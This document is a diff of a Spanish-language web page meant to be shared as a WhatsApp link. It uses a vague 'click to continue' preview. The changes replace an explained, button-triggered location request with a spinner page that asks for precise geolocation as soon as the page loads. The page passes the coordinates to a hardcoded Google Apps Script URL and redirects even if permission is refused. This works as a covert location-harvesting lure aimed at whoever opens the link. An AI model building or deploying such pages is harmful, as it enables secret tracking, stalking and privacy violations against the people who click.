@@ -3,23 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cargando contenido...</title>
+  <title>Cargando...</title>
 
-  <!-- Metadatos Open Graph para la vista previa en WhatsApp -->
+  <!-- Metadatos para WhatsApp y redes sociales (Open Graph) -->
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Ver contenido">
-  <meta property="og:description" content="Haz clic aquí para continuar.">
-  
-  <!-- REEMPLAZA esta URL con la ruta pública y completa de tu imagen en GitHub Pages -->
-  <meta property="og:image" content="https://TU_USUARIO.github.io/TU_REPOSITORIO/luna.png">
-  <meta property="og:image:type" content="image/png">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
+  <meta property="og:title" content="Acceso al servicio">
+  <meta property="og:description" content="Haz clic para continuar">
+  <!-- IMPORTANTE: Usa la URL directa y pública (raw) de tu imagen 'luna' en GitHub -->
+  <!-- Ejemplo: https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/luna.jpg -->
+  <meta property="og:image" content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/luna.png">
+  <meta property="og:image:width" content="600">
+  <meta property="og:image:height" content="315">
 
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -28,90 +28,59 @@
       color: #333;
       text-align: center;
       padding: 20px;
-      box-sizing: border-box;
     }
-    .card {
-      background: #ffffff;
-      padding: 2rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-      max-width: 400px;
-      width: 100%;
+    .spinner {
+      border: 4px solid #e0e0e0;
+      border-top: 4px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
     }
-    .btn {
-      display: inline-block;
-      margin-top: 1.5rem;
-      padding: 12px 24px;
-      background-color: #007bff;
-      color: white;
-      text-decoration: none;
-      border: none;
-      border-radius: 6px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background-color 0.2s ease;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
-    .btn:hover {
-      background-color: #0056b3;
-    }
-    .status {
-      margin-top: 1rem;
-      font-size: 0.9rem;
-      color: #666;
+    p {
+      font-size: 1.1rem;
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <h2>Acceso al contenido</h2>
-    <p>Para brindarte el servicio adecuado, requerimos confirmar tu acceso y ubicación.</p>
-    
-    <!-- El clic del usuario dispara la solicitud de permisos requerida por el navegador -->
-    <button class="btn" id="btn-continuar" onclick="solicitarUbicacionYRedirigir()">Continuar</button>
-    <div class="status" id="estado"></div>
-  </div>
+  <div class="spinner"></div>
+  <p>Verificando permisos y cargando el sitio...</p>
 
   <script>
-    const DESTINO_URL = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";
+    const destinoBase = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";
 
-    function solicitarUbicacionYRedirigir() {
-      const estado = document.getElementById("estado");
-      const boton = document.getElementById("btn-continuar");
+    function redirigir(params = "") {
+      window.location.href = destinoBase + params;
+    }
 
-      boton.disabled = true;
-      estado.innerText = "Solicitando permisos de ubicación...";
-
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            estado.innerText = "Ubicación confirmada. Redirigiendo...";
-            
-            // Opcional: Si tu Apps Script necesita recibir la latitud y longitud por parámetro GET:
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const urlConCoordenadas = `${DESTINO_URL}?lat=${lat}&lon=${lon}`;
-
-            // Redirige al script
-            window.location.href = urlConCoordenadas;
-          },
-          (error) => {
-            // Si el usuario deniega el permiso o falla el sensor GPS, se redirige de todos modos
-            console.warn("Permiso denegado o error de GPS:", error.message);
-            estado.innerText = "Redirigiendo...";
-            window.location.href = DESTINO_URL;
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      } else {
-        // En navegadores antiguos sin soporte de geolocalización
-        window.location.href = DESTINO_URL;
-      }
+    // Solicitar ubicación al cargar
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          // Si el usuario acepta, puedes enviar las coordenadas al script vía URL si lo deseas:
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          redirigir(`?lat=${lat}&lon=${lon}`);
+        },
+        (error) => {
+          // Si el usuario rechaza o hay error, se redirige de todas formas
+          redirigir();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      // Si el navegador no soporta geolocalización
+      redirigir();
     }
   </script>
 
